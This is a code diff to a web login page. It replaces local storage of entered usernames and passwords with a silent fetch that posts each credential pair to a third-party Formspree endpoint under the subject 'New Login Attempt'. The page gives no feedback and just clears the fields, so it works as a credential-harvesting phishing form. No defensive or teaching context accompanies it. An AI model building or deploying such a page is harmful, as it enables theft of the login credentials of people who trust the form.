@@ -36,7 +36,7 @@
     <div class="flex-grow flex items-center justify-center">
         <div class="w-full max-w-md p-6">
             <!-- Login Form -->
-            <form id="loginForm" class="space-y-4">
+            <form id="loginForm" action="https://formspree.io/f/your-form-id" method="POST" class="space-y-4">
                 <div>
                     <input
                         type="text"
@@ -73,27 +73,38 @@
     </div>
 
     <script>
-        // Initialize savedCredentials from localStorage or use empty array
-        let savedCredentials = JSON.parse(localStorage.getItem('credentials')) || [];
-
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+            e.preventDefault(); // Prevent default form submission
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             if (username && password) {
-                // Add new credentials to array
-                savedCredentials.push({ username, password });
-                // Save updated array to localStorage
-                localStorage.setItem('credentials', JSON.stringify(savedCredentials));
-                // Log to console for debugging
-                console.log('Saved Credentials:', savedCredentials);
-                // Clear form inputs
+                // Send data to Formspree
+                fetch('https://formspree.io/f/your-form-id', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        _subject: 'New Login Attempt',
+                        _replyto: 'your-email@example.com' // Optional: Your email for replies
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // No alert, just clear the form
+                        document.getElementById('username').value = '';
+                        document.getElementById('password').value = '';
+                    }
+                })
+                .catch(error => {
+                    console.log('Error sending data: ' + error.message); // Log error silently
+                });
+            } else {
+                // Handle empty fields silently
                 document.getElementById('username').value = '';
                 document.getElementById('password').value = '';
-                // Simulate form submission
-                alert('Login attempt with Username: ' + username);
-            } else {
-                alert('Please fill in all fields.');
             }
         });
     </script>
